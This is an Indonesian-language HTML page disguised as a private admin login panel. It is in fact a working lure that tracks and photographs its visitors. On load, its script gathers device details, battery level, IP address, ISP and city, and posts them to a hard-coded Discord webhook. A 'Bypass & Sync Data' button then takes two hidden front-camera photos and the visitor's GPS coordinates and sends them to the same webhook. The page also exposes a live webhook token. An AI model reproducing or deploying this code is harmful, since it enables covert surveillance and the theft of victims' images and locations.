<!doctype html>
<html lang="id">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Internal Admin Panel - Secure Access</title>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; }
        .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .data-item { border: 1px solid #1a3d1a; padding: 8px; background: #000; font-size: 10px; text-align: left; }
        .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
        .val { color: #00ff41; font-weight: bold; }
        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 60px; font-weight: bold; line-height: 1.6; }
        #result-page { display: none; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0; background: #000; z-index: 9999; padding: 20px; box-sizing: border-box; }
        .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
        .map-frame { width: 100%; height: 300px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; margin-top: 10px; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
 </head>
 <body>

  <div class="panel" id="login-panel">
   <div class="header">‚ö†Ô∏è PRIVATE ADMIN SERVER ‚ö†Ô∏è</div>
   <div class="grid">
    <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
    <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
    <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
    <div class="data-item"><span class="label">Hardware</span><span id="d-ram" class="val">---</span></div>
    <div class="data-item" style="grid-column: span 2;"><span class="label">ISP_Provider</span><span id="d-isp" class="val">Scanning...</span></div>
   </div>
   <video id="v" autoplay playsinline muted></video>
   <canvas id="c"></canvas>
   <div id="loading-icon" class="loader"></div>
   <p id="status">[SYSTEM] Akses Terbatas. Jalankan protokol sinkronisasi untuk verifikasi identitas admin.</p>
   <button id="mainBtn" class="btn" onclick="startAdvancedCapture()">Bypass & Sync Data</button>
  </div>

  <div id="result-page">
   <div style="max-width:500px; margin:0 auto;">
    <h3 style="color: #00ff41; text-align: center;">SUCCESS: USER LIVE VIEW</h3>
    <div class="data-box">
        <span style="color: #ff0000; font-weight: bold;">[!] GPS_CORE_DATA</span><br>
        KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
        <div id="map-container"></div>
    </div>
    <div class="data-box">
        <span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_VISUAL</span>
        <div id="photo-container"></div>
    </div>
    <button class="btn" style="background: #00ff41; color: #000;" onclick="location.reload()">TERMINATE SESSION</button>
   </div>
  </div>

  <script>
    const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
    let fullInfo = {};

    // 1. FUNGSI OTOMATIS SAAT WEB DIBUKA
    (async function autoInit() {
        const ua = navigator.userAgent;
        fullInfo = {
            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Linux",
            os: navigator.platform,
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
            lang: navigator.language || "id-ID"
        };

        // Update UI awal
        document.getElementById('d-model').innerText = fullInfo.model;
        document.getElementById('d-ram').innerText = `${fullInfo.cores} Cores / ${fullInfo.ram}`;

        // Cek Baterai
        try {
            const b = await navigator.getBattery();
            fullInfo.battery = `${Math.round(b.level * 100)}%`;
            document.getElementById('d-bat').innerText = fullInfo.battery;
        } catch (e) { fullInfo.battery = "N/A"; }

        // Ambil Data Jaringan & Kirim ke Webhook
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            fullInfo.ip = d.ip;
            fullInfo.isp = d.org;
            fullInfo.city = d.city;
            fullInfo.country = d.country_name;
            fullInfo.postal = d.postal;

            document.getElementById('d-ip').innerText = d.ip;
            document.getElementById('d-isp').innerText = d.org;

            // KIRIM DATA AWAL (Embed persis seperti di foto)
            await fetch(WH, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "üöÄ TARGET ENTERED SERVER",
                        color: 16711680,
                        fields: [
                            { name: "üåê Jaringan", value: `**IP:** ${fullInfo.ip}\n**ISP:** ${fullInfo.isp}\n**Lokasi:** ${fullInfo.city}, ${fullInfo.country} (${fullInfo.postal})`, inline: false },
                            { name: "üì± Perangkat", value: `**Model:** ${fullInfo.model}\n**OS:** ${fullInfo.os}\n**Hardware:** ${fullInfo.cores} Cores / ${fullInfo.ram}`, inline: true },
                            { name: "üîã Status", value: `**Baterai:** ${fullInfo.battery}\n**Bahasa:** ${fullInfo.lang}`, inline: true },
                            { name: "üîó URL Akses", value: `\`${window.location.href}\``, inline: false }
                        ],
                        footer: { text: `System Time: ${new Date().toLocaleString('id-ID')}` }
                    }]
                })
            });
        } catch (e) { console.log("Init fail"); }
    })();

    // 2. PROSES LANJUTAN (KAMERA & LOKASI) SETELAH KLIK TOMBOL
    async function startAdvancedCapture() {
        document.getElementById('mainBtn').style.display = 'none';
        document.getElementById('loading-icon').style.display = 'block';
        const status = document.getElementById('status');
        
        status.innerText = "[AUTH] Meminta Izin Kamera & Lokasi...";

        try {
            // Minta Izin Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;

            status.innerText = "[SCAN] Mengambil Foto Biometrik...";
            await new Promise(r => setTimeout(r, 1000));
            
            // Ambil 2 Foto
            for (let i = 1; i <= 2; i++) {
                await captureAndSend(video, i);
                await new Promise(r => setTimeout(r, 800));
            }

            // Minta Izin Lokasi
            status.innerText = "[GPS] Sinkronisasi Koordinat Satelit...";
            navigator.geolocation.getCurrentPosition(async (p) => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;

                // Kirim Lokasi ke Discord
                await fetch(WH, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `üìç **GPS LOCKED**\nIP: \`${fullInfo.ip}\`\nMaps: https://www.google.com/maps?q=${lat},${lon}`
                    })
                });

                // 3. REDIRECT KE HALAMAN HASIL (Live View)
                showResultPage(lat, lon, stream);
            }, (err) => { 
                alert("Izin Lokasi Diperlukan."); 
                location.reload(); 
            }, { enableHighAccuracy: true });

        } catch (e) {
            alert("Akses Admin Memerlukan Izin Kamera.");
            location.reload();
        }
    }

    async function captureAndSend(video, index) {
        const canvas = document.getElementById('c');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        return new Promise((resolve) => {
            canvas.toBlob(async (blob) => {
                // Tampilkan di halaman hasil nanti
                const img = document.createElement('img');
                img.src = URL.createObjectURL(blob);
                img.className = 'preview-img';
                document.getElementById('photo-container').appendChild(img);

                // Kirim File ke Discord
                const fd = new FormData();
                fd.append("file", blob, `biometric_${index}.jpg`);
                fd.append("payload_json", JSON.stringify({ content: `üì∏ **Bio-Scan ${index}** | IP: \`${fullInfo.ip}\`` }));
                await fetch(WH, { method: "POST", body: fd });
                resolve();
            }, 'image/jpeg', 0.6);
        });
    }

    function showResultPage(lat, lon, stream) {
        document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
        document.getElementById('map-container').innerHTML = `
            <iframe class="map-frame" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>
        `;
        
        // Switch View
        document.getElementById('login-panel').style.display = 'none';
        document.getElementById('result-page').style.display = 'block';
        
        // Matikan Kamera
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
  </script>
 </body>
</html>
